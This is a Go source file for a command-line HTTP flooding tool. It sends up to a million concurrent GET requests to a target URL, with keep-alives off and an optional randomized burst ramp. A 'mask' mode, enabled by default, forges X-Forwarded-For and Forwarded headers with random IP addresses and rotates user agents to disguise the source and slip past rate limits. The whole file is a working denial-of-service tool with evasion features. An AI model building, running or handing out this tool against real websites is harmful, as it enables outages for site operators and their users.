package main

import (
	"context"
	"crypto/rand"
	_ "embed"
	"flag"
	"fmt"
	"math/big"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"time"
)

var (
	client     *http.Client
	timeoutDur time.Duration
	reqMut     sync.Mutex
	suc, fail  int
)

func randomInt(min, max int) int {
	nBig, err := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	if err != nil {
		return min
	}
	return int(nBig.Int64()) + min
}

func generateIP() string {
	class := randomInt(1, 3)

	var firstOctet uint8
	switch class {
	case 1:
		firstOctet = uint8(randomInt(1, 126))
	case 2:
		firstOctet = uint8(randomInt(128, 191))
	case 3:
		firstOctet = uint8(randomInt(192, 223))
	}

	secondOctet := uint8(randomInt(0, 255))
	thirdOctet := uint8(randomInt(1, 255))
	fourthOctet := uint8(randomInt(1, 254))

	return fmt.Sprintf("%d.%d.%d.%d", firstOctet, secondOctet, thirdOctet, fourthOctet)
}

//go:embed user_agents.txt
var userAgentsRaw string

var userAgents []string

func init() {
	lines := strings.Split(strings.TrimSpace(userAgentsRaw), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			userAgents = append(userAgents, line)
		}
	}
	if len(userAgents) == 0 {
		fmt.Fprintln(os.Stderr, "Warning: embedded user_agents.txt is empty")
	}
}

func fetchUrl(url string, mask bool) {
	ctx, cancel := context.WithTimeout(context.Background(), timeoutDur)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		fmt.Printf("Error creating request for URL %s: %v\n", url, err)
		updateStats(0)
		return
	}
	req.Close = true

	if mask {
		if len(userAgents) == 0 {
			fmt.Println("No user agents available, skipping mask")
			updateStats(0)
			return
		}
		randomIndex := randomInt(0, len(userAgents)-1)

		fIP := generateIP()
		req.Header.Set("Forwarded", fmt.Sprintf("for=%s; proto=https", fIP))
		req.Header.Set("X-Forwarded-For", fIP)
		req.Header.Set("User-Agent", userAgents[randomIndex])
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:156.0) Gecko/20100101 Firefox/156.0")
	}

	resp, err := client.Do(req)
	if err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			fmt.Printf("Request to %s timed out after %d seconds\n", url, int(timeoutDur))
			updateStats(503)
			return
		}
		fmt.Printf("Error fetching URL %s: %v\n", url, err)
		updateStats(404)
		return
	}
	defer resp.Body.Close()

	updateStats(resp.StatusCode)
	return
}

func randomizedRamp(numRequests int, fn func()) {
	remReqs := numRequests
	divisor := float64(randomInt(1100, 1600)) / 1000.0
	minBatchBase := int(float64(numRequests) / divisor)

	for remReqs > 0 {
		randMin := randomInt(6400, 10000)
		minBatch := randMin
		if minBatchBase > randMin {
			minBatch = minBatchBase
		}
		if minBatch > remReqs {
			minBatch = remReqs
		}

		batchSize := randomInt(minBatch, remReqs)
		for i := 0; i < batchSize; i++ {
			go fn()
		}
		remReqs -= batchSize

		time.Sleep(time.Duration(randomInt(128, 640)) * time.Millisecond)
	}
}

func updateStats(statCode int) {
	reqMut.Lock()
	defer reqMut.Unlock()

	if statCode >= 200 && statCode < 300 {
		suc++
	} else {
		fail++
	}
}

func printStat() {
	reqMut.Lock()
	defer reqMut.Unlock()

	fmt.Printf("Successful requests: %d\nUnsuccessful requests: %d\n", suc, fail)
	fmt.Printf("Total requests: %d\n", suc+fail)
}

func main() {
	urlPtr := flag.String("url", "", "Target URL (required)")
	flag.StringVar(urlPtr, "u", "", "shorthand for -url")

	requestsPtr := flag.Int("requests", 1, "Number of requests (default: random 20-32)")
	flag.IntVar(requestsPtr, "r", 1, "shorthand for -requests")

	rampPtr := flag.Bool("ranramp", false, "Enable randomized request ramp-up (default: false)")
	maskPtr := flag.Bool("mask", true, "Use IP masking (default: true)")

	printUsage := func(printReceivedArgs bool) {
		fmt.Fprintf(os.Stderr, "Usage: %s [flags]\n\nFlags:\n", os.Args[0])
		flag.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\nExamples:\n")
		fmt.Fprintf(os.Stderr, "  %s -url https://example.com -ranramp\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s -url https://example.com -requests 50 -mask false\n", os.Args[0])

		if printReceivedArgs {
			fmt.Fprintf(os.Stderr, "\nReceived arguments:\n")
			for i, arg := range os.Args {
				fmt.Fprintf(os.Stderr, "  [%d] %s\n", i, arg)
			}
		}
	}

	flag.Usage = func() { printUsage(false) }

	args := os.Args[:1]
	for _, a := range os.Args[1:] {
		if !strings.HasPrefix(a, "/proc/self/fd/") {
			args = append(args, a)
		}
	}
	os.Args = args

	flag.Parse()

	if *urlPtr == "" {
		fmt.Fprintln(os.Stderr, "Error: Target URL is required.")

		printUsage(true)
		os.Exit(1)
	}
	url := *urlPtr
	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
		url = "http://" + url
	}

	numRequests := *requestsPtr
	if numRequests <= 0 {
		numRequests = randomInt(20, 32)
		fmt.Printf("Using random number of requests: %d\n", numRequests)
	}
	if numRequests > 1000000 {
		fmt.Printf("Cannot create more than 1000000 requests, given %d requests\nCreating 1000000 requests\n", numRequests)
		numRequests = 1000000
	}

	timeoutDur = time.Duration(randomInt(32, 64)) * time.Second

	client = &http.Client{
		Transport: &http.Transport{
			DisableKeepAlives:   true,
			MaxIdleConns:        0,
			MaxIdleConnsPerHost: 0,
			IdleConnTimeout:     1 * time.Millisecond,
			TLSHandshakeTimeout: 10 * time.Second,
			ForceAttemptHTTP2:   false,
		},
	}

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt)
	go func() {
		<-sigChan
		printStat()
		fmt.Println("Requests interrupted")
		os.Exit(0)
	}()

	fmt.Printf("Starting %d requests to %s, use ctrl+c to stop...\n", numRequests, url)
	var wg sync.WaitGroup

	if *rampPtr {
		randomizedRamp(numRequests, func() {
			wg.Go(func() {
				fetchUrl(url, *maskPtr)
			})
		})
	} else {
		for i := 0; i < numRequests; i++ {
			wg.Go(func() {
				fetchUrl(url, *maskPtr)
			})
		}
	}

	wg.Wait()
	fmt.Print("\n")
	printStat()
	fmt.Println("Requests completed")
}
